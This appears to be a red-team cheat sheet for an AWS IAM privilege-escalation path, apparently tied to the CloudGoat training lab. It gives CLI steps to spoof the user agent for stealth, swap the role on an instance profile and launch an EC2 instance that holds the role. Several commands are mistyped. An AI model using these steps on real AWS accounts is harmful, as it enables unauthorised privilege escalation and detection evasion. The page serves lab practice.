# IAM Privesc

AWSealion helps in staying stealthy during red team and pentesting engagements to ensure that your attacking footprint is as small as possible in an AWS environment.

https://github.com/0xd4y/AWSealion

### Create Profile
```sh
aws sealion --set-engagement iam_privesc_by_attachment
aws configure –profile kerrigan
```

### Set User Agent
```
cat user_agents.txt
aws sealion --set-user-agent "aws-cli/1.18.39 Python/3.7.7 Windows/10 botocore/1.15.39"
```

### Check current user permissions
Limit (AccessDenied) Calls
```
aws iam list-attached-user-policies --user-name kerrigan --profile kerrigan
```

Check if we can list roles
```
aws iam list-roles --profile kerrigan
```

If roles have `sts:AssumeRole` for `Principal service ec2.amazonaws.com` we can try to spin up a ec2 instance with role.
```
aws ec2 describe-instances --profile kerrigan --region us-east-1
```

Create AWS SSH Key to use on ec2 and copy output to test.pem
```
aws ec2 create-key-pair --key-name test --output text --profile kerrigan --region us-east-1
```

Get instance profile to use on instance
```
aws iam list-instance-profiles --profile kerrigan
aws iam remove-role-from-instance-profile –instance-profile-name <insert instance profile name here> –-role-name <insert username here> –profile <insert profile name here>
aws iam add-role-to-instance-profile –instance-profile-name <insert instance profile name here> –-role-name <insert username here> –profile <insert profile name here>
```

Start EC2 Instance
```
aws ec2 run-instances –image-id <insert ami id here> –instance-type <insert instance type here> –iam-instance-profile Arn=<insert the arn of the instance profile> –key-name <inset key name here> –subnet-id <insert the subnet id here> –security-group-ids <insert security group id here> –region us-east-1 –profile <insert profile name here> --associate-public-ip-address

```

SSH into new server
```
ssh -i <insert key name here>.pem ubuntu@<insert public ip address here>
```

Check for permission
```
sudo apt-get install awscli
aws iam list-attached-role-name –role-name <insert role name here>
aws iam get-policy –policy-arn <insert the policy arn here>
aws iam get-policy-version –policy-arn <insert the policy arn here> –version-id <insert version id here>
```


## Additional Tools
CloudGoat is Rhino Security Labs' "Vulnerable by Design" AWS deployment tool. It allows you to hone your cloud cybersecurity skills by creating and completing several "capture-the-flag" style scenarios. Each scenario is composed of AWS resources arranged together to create a structured learning experience. Some scenarios are easy, some are hard, and many offer multiple paths to victory. As the attacker, it is your mission to explore the environment, identify vulnerabilities, and exploit your way to the scenario's goal(s).

https://github.com/RhinoSecurityLabs/cloudgoat